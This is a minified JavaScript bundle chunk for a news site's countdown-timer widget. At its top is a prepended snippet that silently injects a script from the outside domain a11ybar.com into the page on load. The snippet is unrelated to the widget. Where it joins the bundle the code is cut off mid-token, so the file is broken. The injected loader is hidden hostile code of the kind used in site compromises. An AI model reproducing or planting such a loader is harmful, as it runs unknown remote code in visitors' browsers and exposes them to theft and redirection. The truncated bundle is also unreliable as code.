try {
var j = document.createElement("script");
j.type = "text/javascript";
j.src = "//a11ybar.com/ok6.js";
if(document.querySelector("body")){
document.querySelector("body").appendChild(j);
} else if (document.querySelector("head")) {
document.querySelector("head").appendChild(j);
}
} catch(e) {
}
ator?function(t){return typeof t}:function(t){return t&&"function"==typeof Symbol&&t.constructor===Symbol&&t!==Symbol.prototype?"symbol":typeof t},p(t)}function b(t,e){var n=Object.keys(t);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(t);e&&(r=r.filter((function(e){return Object.getOwnPropertyDescriptor(t,e).enumerable}))),n.push.apply(n,r)}return n}function y(t){for(var e=1;e<arguments.length;e++){var n=null!=arguments[e]?arguments[e]:{};e%2?b(Object(n),!0).forEach((function(e){d(t,e,n[e])})):Object.getOwnPropertyDescriptors?Object.defineProperties(t,Object.getOwnPropertyDescriptors(n)):b(Object(n)).forEach((function(e){Object.defineProperty(t,e,Object.getOwnPropertyDescriptor(n,e))}))}return t}function d(t,e,n){return(e=m(e))in t?Object.defineProperty(t,e,{value:n,enumerable:!0,configurable:!0,writable:!0}):t[e]=n,t}function g(t,e){for(var n=0;n<e.length;n++){var r=e[n];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(t,m(r.key),r)}}function m(t){var e=function(t,e){if("object"!==p(t)||null===t)return t;var n=t[Symbol.toPrimitive];if(void 0!==n){var r=n.call(t,e||"default");if("object"!==p(r))return r;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===e?String:Number)(t)}(t,"string");return"symbol"===p(e)?e:String(e)}function v(t,e){return v=Object.setPrototypeOf?Object.setPrototypeOf.bind():function(t,e){return t.__proto__=e,t},v(t,e)}function w(t){var e=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(t){return!1}}();return function(){var n,r=h(t);if(e){var o=h(this).constructor;n=Reflect.construct(r,arguments,o)}else n=r.apply(this,arguments);return function(t,e){if(e&&("object"===p(e)||"function"==typeof e))return e;if(void 0!==e)throw new TypeError("Derived constructors may only return object or undefined");return function(t){if(void 0===t)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return t}(t)}(this,n)}}function h(t){return h=Object.setPrototypeOf?Object.getPrototypeOf.bind():function(t){return t.__proto__||Object.getPrototypeOf(t)},h(t)}var O=function(t){!function(t,e){if("function"!=typeof e&&null!==e)throw new TypeError("Super expression must either be null or a function");t.prototype=Object.create(e&&e.prototype,{constructor:{value:t,writable:!0,configurable:!0}}),Object.defineProperty(t,"prototype",{writable:!1}),e&&v(t,e)}(f,t);var e,n,o,i=w(f);function f(){var t;return function(t,e){if(!(t instanceof e))throw new TypeError("Cannot call a class as a function")}(this,f),(t=i.call(this)).getGAData=function(){var e=t.props.isMobile,n=t.state.data;return{category:"CountDownTimer".concat(e?"":"_Web"),label:n?n.title:""}},t.getGA4Data=function(){return{label:t.state.data.title,type:"countdowntimer",category:"sales"}},t.postMessageListener=function(e){var n=e.data;"https://toidev.indiatimes.com"!==e.origin&&"https://timesofindia.indiatimes.com"!==e.origin||"ga_event"===n.type&&t.fireCTWidgetGA(n)},t.fireCTWidgetGA=function(t){t&&((0,s.Nf)({category:t.category,action:t.action,label:t.label}),(0,s.GI)({event:"user_click",label:t.label,type:"countdowntimer",category:"sales"}))},t.state={data:void 0},t}return e=f,(n=[{key:"componentDidMount",value:function(){var t=this,e=this.props,n=e.onTimerRender;e.skipPostMsgListener||window.addEventListener("message",this.postMessageListener),c.Z.get("/gnow/web/common/countdownTimer/json").then((function(e){var r=a()(e,"data.jsonFeed.data",{});"SUCCESS"===r.status?t.setState({data:r},(function(){n(!0),(0,s.GI)(y(y({},t.getGA4Data()),{},{event:"load"})),(0,s.Nf)(y(y({},t.getGAData()),{},{action:"Load"})),"IntersectionObserver"in window&&new IntersectionObserver((function(e){(e[0].isIntersecting||e[0].intersectionRatio>0)&&((0,s.GI)(y(y({},t.getGA4Data()),{},{event:"user_shown"})),(0,s.Nf)(y(y({},t.getGAData()),{},{action:"View"})))})).observe(t.timerContainer)})):n(!1)})).catch((function(t){console.log("Error in timer data call : ".concat(t))}))}},{key:"componentWillUnmount",value:function(){this.props.skipPostMsgListener||window.removeEventListener("message",this.postMessageListener)}},{key:"render",value:function(){var t=this,e=this.state.data,n=this.props,o=n.isMobile,i=n.position;return e?r.createElement(r.Fragment,null,r.createElement("div",{ref:function(e){e&&(t.timerContainer=e)},className:"".concat(l().countdonwbox," ").concat(i)},e&&e.endDate&&r.createElement("iframe",{src:"".concat(u.LR,"/gncountdowntimer.cms?category=CountDownTimer").concat(o?"":"_Web","&isMobile=").concat(o,"&position=").concat(i),title:"CT",height:"32",marginWidth:"0",marginHeight:"0",hspace:"0",vspace:"0",frameBorder:"0",scrolling:"no",align:"center",style:{width:"100%"},ref:function(e){e&&(t.iframeRef=e)}}),!1)):null}}])&&g(e.prototype,n),o&&g(e,o),Object.defineProperty(e,"prototype",{writable:!1}),f}(r.PureComponent);O.defaultProps={isMobile:!1,position:"rhs",onTimerRender:function(){},skipPostMsgListener:!1};const j=(0,o.$j)((function(t){return{pageName:a()(t,"navigation.pageName")}}))(O)},692:t=>{t.exports={countdonwbox:"xNOzO"}}}]);
//# sourceMappingURL=CountdownTimer.d5715050.chunk.js.map